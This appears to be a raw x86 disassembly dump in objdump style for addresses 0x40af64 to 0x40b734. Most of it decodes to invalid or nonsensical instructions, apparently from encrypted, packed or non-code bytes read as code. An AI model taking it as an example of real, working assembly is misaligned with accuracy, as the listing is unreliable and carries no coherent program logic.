  40af64:	test   cl,dl
  40af66:	or     dl,al
  40af68:	(bad)  
  40af69:	sbb    DWORD PTR [edi+0x2d34ff14],edx
  40af6f:	add    BYTE PTR cs:[esi+0x1bff2467],dh
  40af76:	sub    DWORD PTR [ecx-0x246fe341],ebx
  40af7c:	test   BYTE PTR [ebp-0x16013e28],bl
  40af82:	xor    dl,BYTE PTR [eax+eax*1]
  40af85:	bound  eax,QWORD PTR [eax]
  40af87:	add    BYTE PTR [edi-0x35],bl
  40af8a:	std    
  40af8b:	add    BYTE PTR [edi+0x4d1289db],ch
  40af91:	inc    edx
  40af92:	sti    
  40af93:	(bad)  
  40af94:	pop    edi
  40af95:	fmul   QWORD PTR [esi-0x73]
  40af98:	push   ebp
  40af99:	pop    ss
  40af9a:	(bad)  
  40af9b:	dec    DWORD PTR [edi+0x7]
  40af9e:	push   0x10
  40afa0:	pop    edi
  40afa1:	xchg   edx,eax
  40afa2:	idiv   dh
  40afa4:	pop    edi
  40afa5:	fdiv   st(5),st
  40afa7:	push   edx
  40afa8:	mov    WORD PTR [edi-0x24110345],ss
  40afae:	std    
  40afaf:	add    ah,ah
  40afb1:	clc    
  40afb2:	mov    WORD PTR [ebp-0x22478],?
  40afb8:	pop    edi
  40afb9:	push   edx
  40afba:	adc    bh,bh
  40afbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afbd:	sbb    dl,BYTE PTR [edi-0x1]
  40afc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afc1:	push   cs
  40afc2:	call   0xfe1cceda
  40afc7:	adc    DWORD PTR [edi],0xffffffc7
  40afca:	std    
  40afcb:	lea    ebp,[ebx*8-0x4b1a0003]
  40afd2:	jmp    0xf7728381
  40afd7:	(bad)  
  40afd8:	pop    edi
  40afd9:	jmp    0xfef6:0xa44f1289
  40afe0:	pop    edi
  40afe1:	jmp    0xc2c9:0x95052fd
  40afe8:	or     al,0x16
  40afea:	push   ebp
  40afeb:	mov    eax,DWORD PTR [eax]
  40afed:	add    ah,bh
  40afef:	xchg   edi,eax
  40aff0:	ret    0xdef8
  40aff3:	jmp    0x3d407f5
  40aff8:	or     al,0x8b
  40affa:	jmp    0xfde9:0xcef8838c
  40b001:	push   eax
  40b002:	and    bl,BYTE PTR [eax]
  40b004:	push   0x0
  40b006:	xor    DWORD PTR [edx-0x211f3b0],ebp
  40b00c:	sbb    eax,DWORD PTR [ebp-0x38ca3f0f]
  40b012:	je     0x40b053
  40b014:	add    al,0x0
  40b016:	xor    DWORD PTR [ebx+0x43a48a72],ebp
  40b01c:	(bad)  
  40b01d:	inc    dh
  40b01f:	inc    esi
  40b020:	repnz mov WORD PTR [edi+ebx*2+0x34],?
  40b025:	lea    ebp,[edi+eiz*2+0x7baefed6]
  40b02c:	push   0xdc40a610
  40b031:	std    
  40b032:	sahf   
  40b033:	add    dl,bh
  40b035:	push   ecx
  40b036:	and    eax,0x8d7c835b
  40b03b:	stos   DWORD PTR es:[edi],eax
  40b03c:	jb     0x40b0b1
  40b03e:	push   ecx
  40b03f:	dec    eax
  40b040:	cdq    
  40b041:	sti    
  40b042:	jg     0x40b066
  40b044:	xlat   BYTE PTR ds:[ebx]
  40b045:	(bad)  
  40b046:	jbe    0x40afe8
  40b048:	push   es
  40b049:	jmp    esp
  40b04b:	mov    dl,0x2d
  40b04d:	call   0xff17ca8b
  40b052:	add    BYTE PTR [eax],al
  40b054:	mov    dl,0xfa
  40b056:	repz (bad) 
  40b058:	push   esi
  40b059:	js     0x40b031
  40b05b:	pop    esp
  40b05d:	adc    esi,DWORD PTR [edx+ebp*8-0x7d]
  40b061:	inc    esi
  40b062:	jo     0x40b05b
  40b064:	aas    
  40b065:	loop   0x40b03c
  40b067:	mov    ah,BYTE PTR [ebx]
  40b069:	jmp    0xfed5:0xd22ff78f
  40b070:	add    ebx,0x35
  40b073:	leave  
  40b074:	repz ret 0x5502
  40b078:	stos   BYTE PTR es:[edi],al
  40b079:	(bad)  
  40b07a:	add    ebx,0x74d728c1
  40b080:	xor    eax,0x69cc9114
  40b085:	adc    al,0xe9
  40b087:	or     dh,cl
  40b089:	inc    esi
  40b08a:	in     al,dx
  40b08b:	xor    eax,0x3dcd5f8
  40b090:	add    BYTE PTR [ecx+ebp*2-0x6772cf3d],dh
  40b097:	mov    BYTE PTR [ebp-0x50],ch
  40b09a:	sbb    BYTE PTR [edx],dh
  40b09c:	into   
  40b09d:	inc    esi
  40b09e:	fucomp st(3)
  40b0a0:	push   edx
  40b0a1:	xchg   edx,eax
  40b0a2:	gs (bad) 
  40b0a4:	or     ecx,ebx
  40b0a6:	outs   dx,DWORD PTR ds:[esi]
  40b0a7:	dec    eax
  40b0a8:	(bad)  [edx+eiz*8-0x5b75c1f3]
  40b0af:	sub    al,0x95
  40b0b1:	adc    ch,BYTE PTR [edi+ebp*4-0x10c06b0f]
  40b0b8:	add    BYTE PTR [eax],al
  40b0ba:	and    bl,al
  40b0bc:	add    esi,ecx
  40b0be:	mov    ecx,0x4eea1946
  40b0c3:	or     dh,dh
  40b0c5:	(bad)  
  40b0c6:	repnz icebp 
  40b0c8:	or     al,0x33
  40b0ca:	or     DWORD PTR [esi-0x55],esp
  40b0cd:	inc    esp
  40b0ce:	xor    DWORD PTR [edi-0x5409445d],ecx
  40b0d4:	adc    al,0x4c
  40b0d6:	xor    DWORD PTR [edx+ebp*2],edx
  40b0d9:	mov    edi,0xbbab8f2a
  40b0de:	inc    al
  40b0e0:	jae    0x40b095
  40b0e2:	dec    esi
  40b0e3:	mov    esp,DWORD PTR [ecx-0x2b]
  40b0e6:	aas    
  40b0e7:	mov    ah,BYTE PTR [ebx]
  40b0e9:	mov    ah,0xec
  40b0eb:	xchg   esp,eax
  40b0ec:	(bad)  
  40b0ed:	lock mov al,ds:0xfd5f67e3
  40b0f3:	mov    edi,0xbf3103e8
  40b0f8:	xor    esi,DWORD PTR [eax+0x2b00628e]
  40b0fe:	jb     0x40b114
  40b100:	lea    esp,[eax*8+0x6a65e84f]
  40b107:	adc    al,0x0
  40b109:	push   0xfffffff1
  40b10b:	or     ecx,DWORD PTR [ebp-0xb052d4]
  40b111:	adc    al,0x9d
  40b113:	mov    bh,0x57
  40b115:	add    al,BYTE PTR [edi+edi*4]
  40b118:	mov    BYTE PTR [ebx*4+0xa54490],ah
  40b11f:	add    BYTE PTR ds:0x559974bf,al
  40b125:	addr16 inc edx
  40b127:	test   al,0x32
  40b129:	mov    edi,0x550bbd34
  40b12e:	add    BYTE PTR [ecx+0x10],al
  40b131:	cmp    bh,bh
  40b133:	dec    esi
  40b134:	cmp    ah,dl
  40b136:	push   cs
  40b137:	ins    DWORD PTR es:[edi],dx
  40b138:	or     al,0xbf
  40b13a:	(bad)  
  40b13b:	jmp    0x6b0909eb
  40b140:	out    0xcf,al
  40b142:	(bad)  
  40b143:	fld    QWORD PTR [esi]
  40b145:	xchg   ebp,eax
  40b146:	(bad)  
  40b147:	call   0xedb5707e
  40b14c:	mov    dl,BYTE PTR [ebx]
  40b14e:	dec    ecx
  40b14f:	jmp    0x6b209686
  40b154:	ins    DWORD PTR es:[edi],dx
  40b155:	adc    eax,0xbec2ac89
  40b15a:	je     0x40b149
  40b15c:	lods   eax,DWORD PTR ds:[esi]
  40b15d:	pop    eax
  40b15e:	mov    ah,0xf6
  40b160:	dec    edi
  40b162:	mov    fs,WORD PTR [edx+esi*2-0x4a4e8b42]
  40b169:	pop    eax
  40b16a:	les    esp,FWORD PTR [esi-0x17008009]
  40b170:	xor    dl,BYTE PTR [ebx+eax*4]
  40b173:	or     al,0x3f
  40b175:	in     eax,dx
  40b176:	inc    eax
  40b177:	add    BYTE PTR [eax],cl
  40b179:	adc    esi,DWORD PTR [eax+edx*2-0x7b]
  40b17d:	(bad)  
  40b17e:	mov    bh,0x50
  40b180:	jb     0x40b195
  40b182:	push   0x0
  40b184:	add    BYTE PTR [eax],al
  40b186:	jb     0x40b1a0
  40b188:	lea    eax,[ebp+0x58]
  40b18b:	add    ebp,DWORD PTR [edx+0x0]
  40b18e:	test   esi,edi
  40b190:	mov    edi,0x3cadc750
  40b195:	sub    DWORD PTR [ecx],ebx
  40b197:	sbb    BYTE PTR [ebx],cl
  40b199:	rcr    ah,0x24
  40b19c:	cmp    DWORD PTR [ebp+0x14],0x13
  40b1a0:	je     0x40b1ce
  40b1a2:	pop    ebx
  40b1a3:	data16 adc BYTE PTR [eax],al
  40b1a6:	mov    esp,0xb8558b0a
  40b1ab:	pusha  
  40b1ac:	mov    DWORD PTR [edx],0x75ff1817
  40b1b2:	nop
  40b1b3:	out    0x73,eax
  40b1b5:	mov    eax,0xffbc4df7
  40b1ba:	fst    QWORD PTR [esi]
  40b1bc:	push   0xbcb78803
  40b1c1:	call   0x3e8ec2
  40b1c6:	push   edi
  40b1c7:	dec    esi
  40b1c8:	mov    esp,0x42e8
  40b1cd:	add    BYTE PTR [edi],dl
  40b1cf:	dec    esi
  40b1d0:	enter  0xf4e8,0x50
  40b1d4:	(bad)  
  40b1d5:	push   DWORD PTR [edi]
  40b1d7:	dec    esi
  40b1d8:	shr    al,1
  40b1da:	in     al,dx
  40b1db:	push   eax
  40b1dc:	(bad)  
  40b1dd:	push   DWORD PTR [esi+0x580cc0c9]
  40b1e3:	in     eax,dx
  40b1e4:	mov    ch,ah
  40b1e6:	fstp   TBYTE PTR [esi-0x3a]
  40b1e9:	lea    eax,[eax]
  40b1eb:	add    BYTE PTR ds:0x26684ee4,cl
  40b1f1:	push   esi
  40b1f2:	inc    ecx
  40b1f3:	add    BYTE PTR [ecx],dh
  40b1f5:	push   ecx
  40b1f6:	or     DWORD PTR [edx+0x31],ebp
  40b1f9:	push   ebx
  40b1fa:	repnz inc ecx
  40b1fc:	jo     0x40b1a9
  40b1fe:	fidivr DWORD PTR [ebp-0x7afd5497]
  40b204:	icebp  
  40b205:	mov    dh,0x7a
  40b207:	mov    edi,0x8b02ab31
  40b20c:	fs ja  0x40b28d
  40b20f:	adc    DWORD PTR [eax+edi*8+0x20ee4fcb],esp
  40b216:	sar    dh,1
  40b218:	sub    DWORD PTR [edi+0x432ebf87],0x72
  40b21f:	call   esi
  40b221:	stos   DWORD PTR es:[edi],eax
  40b222:	test   DWORD PTR [ecx+ecx*8-0x55],edi
  40b226:	add    DWORD PTR [ebp+ebx*4-0x9fffd55],eax
  40b22d:	jo     0x40b1e5
  40b22f:	push   DWORD PTR [esi-0xb38fd55]
  40b235:	add    al,BYTE PTR [eax+eax*1]
  40b238:	xor    DWORD PTR [ebx+0x238144c9],ebp
  40b23e:	add    al,0x0
  40b240:	xor    esi,esi
  40b242:	dec    eax
  40b243:	int3   
  40b244:	xor    DWORD PTR [ebx-0x5745fffe],ebp
  40b24a:	retf   0x238a
  40b24d:	dec    eax
  40b24e:	dec    ecx
  40b24f:	int3   
  40b250:	add    BYTE PTR [eax],al
  40b252:	loope  0x40b283
  40b254:	dec    ecx
  40b255:	rol    BYTE PTR [ecx],1
  40b257:	xchg   ecx,eax
  40b258:	add    edi,edi
  40b25a:	fsub   QWORD PTR [edx]
  40b25c:	rcl    DWORD PTR [ecx+0x2d],cl
  40b25f:	ret    0x74c2
  40b262:	std    
  40b263:	sub    DWORD PTR [ecx-0x34],edx
  40b266:	xor    BYTE PTR [eax+0x41],al
  40b269:	add    esp,0x26
  40b26c:	add    al,0x74
  40b26e:	not    DWORD PTR [ebx]
  40b270:	push   ecx
  40b271:	inc    edx
  40b272:	repz push edx
  40b274:	jmp    0xc129584b
  40b279:	enter  0x146e,0xe9
  40b27d:	(bad)  
  40b27e:	fiadd  WORD PTR [edi-0xd]
  40b281:	imul   ebp,esi,0xb803e913
  40b287:	push   esi
  40b288:	mov    eax,ds:0x23d52fde
  40b28d:	mov    esp,0x3e8bcfe
  40b292:	test   BYTE PTR [esi-0x4f],0xd2
  40b296:	gs call 0xac7a0b31
  40b29c:	xchg   al,dl
  40b29e:	fistp  QWORD PTR [ebp+eax*4-0x295402a8]
  40b2a5:	cmp    esi,DWORD PTR [ecx]
  40b2a7:	adc    al,0x6a
  40b2a9:	push   eax
  40b2aa:	jmp    0xc03ca7c2
  40b2af:	inc    esi
  40b2b0:	inc    ecx
  40b2b1:	fld    TBYTE PTR [esi]
  40b2b3:	dec    esp
  40b2b4:	jmp    0x9a40b2bc
  40b2b9:	(bad)  
  40b2ba:	popa   
  40b2bb:	cmp    BYTE PTR [ecx+0x25d2fa88],ch
  40b2c1:	mov    esp,0x89293545
  40b2c6:	xchg   ebx,eax
  40b2c7:	iret   
  40b2c8:	mov    ebx,0x85583621
  40b2cd:	mov    esp,0xd169fb9a
  40b2d2:	in     al,dx
  40b2d3:	add    ebx,esp
  40b2d5:	mov    BYTE PTR [esi+eax*4],cl
  40b2d8:	jb     0x40b28d
  40b2da:	mov    esi,0xaaa22586
  40b2df:	inc    esp
  40b2e0:	xor    DWORD PTR [esp+edi*2],edx
  40b2e3:	icebp  
  40b2e4:	outs   dx,DWORD PTR ds:[esi]
  40b2e5:	push   ss
  40b2e6:	pop    ebx
  40b2e7:	inc    ebp
  40b2e8:	lock adc eax,DWORD PTR [eax]
  40b2eb:	call   0x2f40c722
  40b2f0:	mov    eax,0x55e94152
  40b2f5:	adc    eax,0x165ba866
  40b2fa:	sub    DWORD PTR [edi+0xf83322f],0x35
  40b301:	inc    ecx
  40b302:	repz push 0x26
  40b305:	retf   0x282d
  40b308:	xor    eax,0xf46d0f14
  40b30d:	mov    ebx,0xf8b5e9fe
  40b312:	leave  
  40b313:	xlat   BYTE PTR ds:[ebx]
  40b314:	jae    0x40b32a
  40b316:	add    dh,ch
  40b318:	mov    dh,0xa9
  40b31a:	(bad)  
  40b31b:	call   0x9772b320
  40b320:	cmp    al,0xcf
  40b322:	cmp    edx,DWORD PTR [ebp+0x0]
  40b325:	jmp    0xea21435b
  40b32a:	xor    dl,BYTE PTR [edi+eax*8]
  40b32d:	sub    al,0xe1
  40b32f:	mov    ebx,0xd332e9fe
  40b334:	inc    esp
  40b335:	popa   
  40b336:	sub    eax,0x2fe90014
  40b33b:	push   eax
  40b33c:	cld    
  40b33d:	mov    ecx,0xb9f85027
  40b342:	cld    
  40b343:	adc    ebp,DWORD PTR [eax+0x49]
  40b346:	out    dx,eax
  40b347:	push   esp
  40b348:	add    BYTE PTR [esi],bh
  40b34a:	xchg   ch,cl
  40b34c:	sub    eax,0xc00f32a8
  40b351:	fidiv  WORD PTR [esi+0x32e8ff81]
  40b357:	xchg   edi,eax
  40b358:	jl     0x40b37b
  40b35a:	xor    eax,0x2d45840b
  40b35f:	adc    al,0x0
  40b361:	push   0xffffffee
  40b363:	mov    bh,0xff
  40b365:	call   FWORD PTR [edi-0x6d]
  40b368:	mov    al,ds:0x8b175800
  40b36d:	jne    0x40b3ab
  40b36f:	fiadd  WORD PTR [eax+0x56174800]
  40b375:	mov    edx,DWORD PTR [esi]
  40b377:	in     eax,0x74
  40b379:	sbb    BYTE PTR [edi-0x79000fae],bl
  40b37f:	les    ecx,FWORD PTR [ebp+0x4000045]
  40b385:	pop    edi
  40b386:	xchg   esi,eax
  40b387:	inc    edx
  40b388:	dec    ecx
  40b389:	adc    al,ch
  40b38b:	xlat   BYTE PTR ds:[ebx]
  40b38c:	push   esi
  40b38d:	adc    BYTE PTR [eax],al
  40b38f:	sar    eax,1
  40b391:	(bad)  
  40b392:	mov    esi,0xe0529102
  40b397:	push   0x415176
  40b39c:	pop    edi
  40b39d:	push   edx
  40b39e:	in     al,0xc7
  40b3a0:	adc    eax,0xc8fffeb4
  40b3a5:	push   ss
  40b3a6:	lea    eax,[ebp-0x40]
  40b3a9:	push   es
  40b3aa:	push   0x1
  40b3ac:	and    dl,BYTE PTR [eax]
  40b3ae:	push   0x0
  40b3b0:	dec    ebp
  40b3b1:	push   edx
  40b3b2:	loopne 0x40b404
  40b3b4:	xor    dl,BYTE PTR [eax]
  40b3b6:	lea    eax,[ebp+0x58]
  40b3b9:	pop    es
  40b3ba:	call   DWORD PTR ds:0x411f4e
  40b3c0:	xchg   ebx,eax
  40b3c1:	(bad)  
  40b3c2:	jb     0x40b3f1
  40b3c4:	or     ecx,DWORD PTR [edx-0x14]
  40b3c7:	add    ah,dl
  40b3c9:	jmp    0x40b382
  40b3cb:	add    DWORD PTR [eax+0x580b0016],ebx
  40b3d1:	arpl   WORD PTR [esi],dx
  40b3d3:	inc    ebp
  40b3d5:	mov    esi,0xe42075fd
  40b3da:	jae    0x40b3c8
  40b3dc:	dec    edi
  40b3dd:	pop    ebp
  40b3de:	or     BYTE PTR [eax+0x31],ch
  40b3e1:	test   eax,0x149fef02
  40b3e6:	sti    
  40b3e7:	clc    
  40b3e8:	add    BYTE PTR [eax],al
  40b3ea:	push   esi
  40b3eb:	adc    eax,edx
  40b3ed:	je     0x40b44c
  40b3ef:	and    al,0x96
  40b3f1:	inc    esp
  40b3f2:	xor    DWORD PTR [ebp-0x3b1300d0],ebp
  40b3f8:	add    ch,0x2d
  40b3fb:	cs push ecx
  40b3fd:	clc    
  40b3fe:	xor    DWORD PTR [edi-0x3],ebx
  40b401:	and    BYTE PTR [edi-0x55],0xfd
  40b405:	test   BYTE PTR [esi+0x16fececa],cl
  40b40b:	stc    
  40b40c:	iret   
  40b40d:	(bad)  
  40b40e:	and    al,0x69
  40b410:	sbb    eax,0xbd213141
  40b415:	shl    DWORD PTR ds:0x58b37ab,0x2f
  40b41c:	enter  0x5bf7,0xab
  40b420:	pop    eax
  40b421:	das    
  40b422:	out    0x18,al
  40b424:	cld    
  40b425:	out    0x90,eax
  40b427:	sbb    al,0xcf
  40b429:	(bad)  
  40b42a:	test   al,0xe8
  40b42c:	iret   
  40b42d:	jg     0x40b43b
  40b42f:	loopne 0x40b471
  40b431:	inc    ecx
  40b432:	xor    DWORD PTR [ebx-0x1ab6d6a9],ebp
  40b438:	inc    eax
  40b439:	inc    ecx
  40b43a:	xor    ebx,esp
  40b43c:	mov    cl,0x40
  40b43e:	lock stos BYTE PTR es:[edi],al
  40b440:	(bad)  
  40b442:	daa    
  40b443:	(bad)  
  40b444:	iret   
  40b445:	test   BYTE PTR [ecx-0x21],dh
  40b448:	sub    ebp,DWORD PTR [eax+0x3f]
  40b44b:	ins    DWORD PTR es:[edi],dx
  40b44c:	inc    ebx
  40b44d:	add    BYTE PTR [eax],al
  40b44f:	add    BYTE PTR [ecx],bl
  40b451:	add    BYTE PTR [ebp+0x41],al
  40b454:	xor    DWORD PTR [ebx-0x4e],edx
  40b457:	jge    0x40b4d7
  40b459:	jmp    0x44ab:0x141c04c5
  40b460:	xor    DWORD PTR [ebx],edx
  40b462:	push   0x11
  40b464:	dec    ebx
  40b465:	push   esi
  40b466:	test   al,0x3
  40b468:	xor    DWORD PTR [eax-0x2d],eax
  40b46b:	(bad)  
  40b46c:	in     eax,dx
  40b46d:	mov    ebx,0x143103e8
  40b472:	rol    bl,cl
  40b474:	mul    BYTE PTR [ebx-0x67]
  40b477:	and    ch,0xbb
  40b47a:	call   0x3145:0x2b1e1dce
  40b481:	(bad)
  40b485:	lods   eax,DWORD PTR ds:[esi]
  40b486:	test   BYTE PTR [edx+0x58e8bc9d],0x33
  40b48d:	lods   eax,DWORD PTR ds:[esi]
  40b48e:	fmulp  st(6),st
  40b490:	test   DWORD PTR [ebp+edi*4+0x3aac3958],edi
  40b497:	retf   
  40b498:	(bad)  
  40b499:	mov    eax,0x8cf93861
  40b49e:	cli    
  40b49f:	into   
  40b4a0:	gs mov esp,0xb939319d
  40b4a6:	sbb    edi,esp
  40b4a8:	(bad)  
  40b4a9:	dec    ebp
  40b4aa:	mov    esi,cs
  40b4ac:	xlat   BYTE PTR ds:[ebx]
  40b4ad:	mov    eax,0xecd6fbfb
  40b4b2:	jle    0x40b482
  40b4b4:	add    BYTE PTR [eax],al
  40b4b6:	(bad)  
  40b4b7:	mov    eax,0x3ebfcffb
  40b4bc:	loope  0x40b499
  40b4be:	bound  eax,QWORD PTR [ebx+0x66]
  40b4c1:	into   
  40b4c2:	jns    0x40b499
  40b4c4:	in     al,0x3
  40b4c6:	cld    
  40b4c7:	mov    WORD PTR [edx+eax*4+0x72],es
  40b4cb:	ret    
  40b4cc:	mov    dh,0x36
  40b4ce:	add    cl,BYTE PTR [ebp+0x1577ff9b]
  40b4d4:	jmp    0x54e5dc
  40b4d9:	(bad)  ss:[ebx]
  40b4dc:	call   0x54a34e
  40b4e1:	push   0x7a
  40b4e3:	adc    esi,DWORD PTR [edi-0x10]
  40b4e6:	dec    ebx
  40b4e7:	aam    0x5a
  40b4e9:	mov    dh,0xc
  40b4eb:	retf   
  40b4ec:	shl    ecx,0x32
  40b4ef:	jecxz  0x40b4d8
  40b4f1:	jb     0x40b4fc
  40b4f3:	or     BYTE PTR [ecx+0xee0cbeb],cl
  40b4f9:	imul   ecx,DWORD PTR [eax-0x44160148],0x3f
  40b500:	or     BYTE PTR [edx+0x7e],dh
  40b503:	or     al,0xeb
  40b505:	inc    ebx
  40b506:	(bad)  
  40b507:	mov    eax,DWORD PTR ds:0x71e80169
  40b50d:	jecxz  0x40b4c1
  40b50f:	mov    ebx,0x94363e38
  40b514:	jmp    0x40b50f
  40b516:	jmp    0xf63535
  40b51b:	add    BYTE PTR [edx+0x42],dh
  40b51e:	or     eax,0x7751e169
  40b523:	icebp  
  40b524:	mov    dl,0xab
  40b526:	inc    eax
  40b527:	imul   edi,ecx,0x39e0eb0d
  40b52d:	aam    0x5a
  40b52f:	cs pop es
  40b531:	int    0xc1
  40b533:	icebp  
  40b534:	xor    bh,al
  40b536:	das    
  40b537:	sti    
  40b538:	retf   0x38fb
  40b53b:	(bad)  
  40b53c:	ss call 0xfbfd3771
  40b542:	inc    eax
  40b543:	fld    TBYTE PTR [eax+0x2cd645fb]
  40b549:	call   0xaad9a28e
  40b54e:	or     BYTE PTR [edx],al
  40b550:	ins    DWORD PTR es:[edi],dx
  40b551:	pop    edx
  40b552:	pop    edi
  40b553:	add    dh,dl
  40b555:	jp     0x40b517
  40b557:	or     BYTE PTR [eax-0x6dfb212d],bl
  40b55d:	iret   
  40b55e:	test   al,0x4b
  40b560:	or     ecx,esi
  40b562:	add    BYTE PTR [ebx],cl
  40b564:	repz pop esi
  40b566:	mov    ds:0xfdb78d8b,al
  40b56b:	xor    bh,dl
  40b56d:	dec    esi
  40b56e:	clc    
  40b56f:	(bad)  
  40b570:	mov    ebp,0x34458dbb
  40b575:	rol    DWORD PTR [ebx-0xc],1
  40b578:	pop    eax
  40b579:	adc    eax,DWORD PTR [eax]
  40b57b:	add    bl,cl
  40b57d:	push   es
  40b57e:	sub    DWORD PTR ds:[eax],eax
  40b581:	add    BYTE PTR [ecx+0x6e740013],cl
  40b587:	aaa    
  40b588:	inc    esp
  40b589:	lock push 0x86a015a
  40b58f:	pop    ebp
  40b590:	add    BYTE PTR [edx+0x8],ch
  40b593:	pop    ebp
  40b594:	add    BYTE PTR [ebp-0xb137a3],cl
  40b59a:	fisttp QWORD PTR [eax]
  40b59c:	sub    DWORD PTR [ecx+0x8],eax
  40b59f:	mov    esp,0x940274be
  40b5a4:	jnp    0x40b59a
  40b5a6:	fcomp  DWORD PTR [esi+0x34]
  40b5a9:	mov    ecx,DWORD PTR ds:0xb84d8b14
  40b5af:	or     ecx,DWORD PTR [eax]
  40b5b1:	ja     0x40b5a5
  40b5b3:	(bad)  
  40b5b4:	mov    DWORD PTR [ebp+0x4c],esi
  40b5b7:	cmp    al,0x7c
  40b5b9:	or     BYTE PTR [ebx-0xa],al
  40b5bc:	out    dx,eax
  40b5bd:	jecxz  0x40b589
  40b5bf:	jecxz  0x40b563
  40b5c1:	mov    ecx,DWORD PTR ds:0x875ff14
  40b5c7:	cmp    bh,bh
  40b5c9:	(bad)  
  40b5ca:	jge    0x40b5aa
  40b5cc:	out    0xe3,al
  40b5ce:	xor    DWORD PTR [edx+0x2],ebp
  40b5d1:	add    cl,bl
  40b5d3:	stos   DWORD PTR es:[edi],eax
  40b5d4:	add    al,BYTE PTR [eax]
  40b5d6:	xor    DWORD PTR [edx+0x2b],esi
  40b5d9:	pop    esi
  40b5da:	js     0x40b5c6
  40b5dc:	cli    
  40b5dd:	dec    DWORD PTR [ebx-0x13]
  40b5e0:	daa    
  40b5e1:	pop    edi
  40b5e2:	xlat   BYTE PTR ds:[ebx]
  40b5e3:	repz rol BYTE PTR [edi],0x0
  40b5e7:	add    BYTE PTR [ecx],dh
  40b5e9:	js     0x40b662
  40b5eb:	jmp    0x40b59f
  40b5ed:	lock ret 0x3167
  40b5f1:	int    0x2
  40b5f3:	add    BYTE PTR [ecx+0x45],cl
  40b5f6:	push   ecx
  40b5f7:	dec    DWORD PTR [esi+0x43]
  40b5fa:	inc    esi
  40b5fb:	cld    
  40b5fc:	fldcw  WORD PTR [edx+eiz*1-0x6eeacf00]
  40b603:	jno    0x40b63b
  40b605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b606:	js     0x40b64c
  40b608:	sub    DWORD PTR [esp+eax*1+0x20],esp
  40b60c:	xor    DWORD PTR [ebx-0x215c5b26],ebp
  40b612:	retf   0x6c88
  40b615:	fistp  WORD PTR [ebx+0x0]
  40b618:	push   ecx
  40b619:	stos   DWORD PTR es:[edi],eax
  40b61a:	add    ch,al
  40b61c:	test   eax,0xa8fecaf9
  40b621:	call   0xb721df9
  40b626:	add    al,0x0
  40b628:	fld    DWORD PTR [edx+0x56]
  40b62b:	jmp    esi
  40b62d:	inc    esp
  40b62e:	inc    ecx
  40b62f:	in     al,dx
  40b630:	dec    ecx
  40b631:	stos   DWORD PTR es:[edi],eax
  40b632:	and    al,BYTE PTR [eax]
  40b634:	xor    DWORD PTR [ebx-0x71318db7],edx
  40b63a:	jl     0x40b680
  40b63c:	fldenv [ebx]
  40b63e:	add    al,0x20
  40b640:	xor    DWORD PTR [ebx+0x264370da],ebp
  40b646:	retf   
  40b647:	mov    ah,dh
  40b649:	adc    ecx,DWORD PTR [ebp-0x35]
  40b64c:	add    BYTE PTR [eax],al
  40b64e:	sbb    eax,0xf3e8d124
  40b653:	push   edx
  40b654:	jmp    0x40f8d423
  40b659:	jnp    0x40b64d
  40b65b:	adc    ebp,ecx
  40b65d:	xchg   BYTE PTR [edx+0x8],dh
  40b660:	ds push ecx
  40b662:	and    DWORD PTR [ecx+edi*8],ebp
  40b665:	inc    esi
  40b666:	lock adc ebp,DWORD PTR [esi]
  40b669:	push   ecx
  40b66a:	imul   ebp,DWORD PTR [esp+eiz*4+0x6a14313f],0x9bb52ac0
  40b675:	repz into 
  40b677:	dec    esi
  40b678:	stos   BYTE PTR es:[edi],al
  40b679:	inc    esp
  40b67a:	xor    DWORD PTR [ebp+0x2b4ecf7b],esi
  40b680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b681:	add    esi,DWORD PTR [ecx]
  40b683:	xchg   ecx,eax
  40b684:	sub    al,0xf8
  40b686:	aaa    
  40b687:	aas    
  40b688:	fstp   DWORD PTR [ebx-0x6b]
  40b68b:	push   ecx
  40b68c:	sub    BYTE PTR [esi+eiz*1],al
  40b68f:	aas    
  40b690:	(bad)  
  40b692:	test   BYTE PTR [eax-0x17],dl
  40b695:	add    esi,DWORD PTR [edx-0x7a352331]
  40b69b:	and    al,0x51
  40b69d:	push   ebx
  40b69e:	jb     0x40b6f3
  40b6a0:	jmp    0xc0e93c6f
  40b6a5:	inc    esi
  40b6a6:	ins    DWORD PTR es:[edi],dx
  40b6a7:	adc    al,0xe9
  40b6a9:	xchg   dl,dh
  40b6ab:	pop    es
  40b6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6ad:	push   eax
  40b6ae:	xor    eax,0x466c2c
  40b6b3:	add    BYTE PTR [eax+0x14],dh
  40b6b6:	xchg   esi,eax
  40b6b7:	push   eax
  40b6b8:	leave  
  40b6b9:	stos   DWORD PTR es:[edi],eax
  40b6ba:	fdivr  DWORD PTR [edi]
  40b6bc:	xor    DWORD PTR [edx+ebp*2],edx
  40b6bf:	mov    edi,0xf3f3b53a
  40b6c4:	push   esi
  40b6c5:	fwait
  40b6c6:	jmp    FWORD PTR [ecx]
  40b6c8:	ins    BYTE PTR es:[edi],dx
  40b6c9:	adc    al,0xff
  40b6cb:	hlt    
  40b6cc:	mov    gs,WORD PTR [esp+ebx*1-0x7cebcd53]
  40b6d3:	and    eax,0x56002aa6
  40b6d8:	add    DWORD PTR [eax-0x4a792b02],edi
  40b6de:	xor    al,0xa5
  40b6e0:	and    eax,0xc3510053
  40b6e5:	inc    eax
  40b6e6:	push   DWORD PTR [esi]
  40b6e8:	cmc    
  40b6e9:	dec    edi
  40b6ea:	loopne 0x40b6af
  40b6ec:	xor    dh,BYTE PTR [ebp+0x3f7b2174]
  40b6f2:	or     al,0x1e
  40b6f4:	inc    ecx
  40b6f5:	pop    eax
  40b6f6:	sub    DWORD PTR [eax-0x6a3f53ce],ebp
  40b6fc:	jnp    0x40b6b3
  40b6fe:	mov    BYTE PTR [esi+ecx*4-0x1101ffd6],ch
  40b705:	mov    edi,0xb53e7cfe
  40b70a:	xor    al,0x8d
  40b70c:	dec    ebp
  40b70d:	push   ebp
  40b70e:	add    cl,dl
  40b710:	les    esp,FWORD PTR [edi]
  40b712:	(bad)  
  40b713:	ficomp WORD PTR [edx+0x43d858]
  40b719:	add    BYTE PTR ds:0xf8d974b3,ch
  40b71f:	sub    al,ch
  40b721:	(bad)  
  40b722:	ss push eax
  40b724:	sub    DWORD PTR [eax],ebp
  40b726:	xor    eax,0xe83d94bc
  40b72b:	mov    dl,0x88
  40b72d:	and    al,0xa1
  40b72f:	cmp    eax,0xc076a600
  40b734:	(bad)  
